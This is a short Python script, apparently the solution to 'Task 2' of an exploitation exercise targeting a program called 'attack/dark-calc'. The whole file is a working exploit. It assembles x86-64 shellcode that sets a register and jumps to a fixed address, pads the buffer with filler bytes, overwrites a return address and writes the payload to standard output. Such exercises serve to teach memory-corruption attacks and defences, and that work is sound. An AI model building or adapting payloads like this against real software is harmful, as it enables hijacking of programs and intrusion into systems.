#!/usr/bin/env python3
"""Task 2: build the payload for attack/dark-calc."""
import sys

# sub rsp, 8; push 4; pop rdi; push 0x401a87; ret
shellcode = b"\x48\x83\xec\x08\x6a\x04\x5f\x68\x87\x1a\x40\x00\xc3"

payload = shellcode + b"A" * 11
payload += (0x721000800fd0).to_bytes(8, "little")

sys.stdout.buffer.write(payload)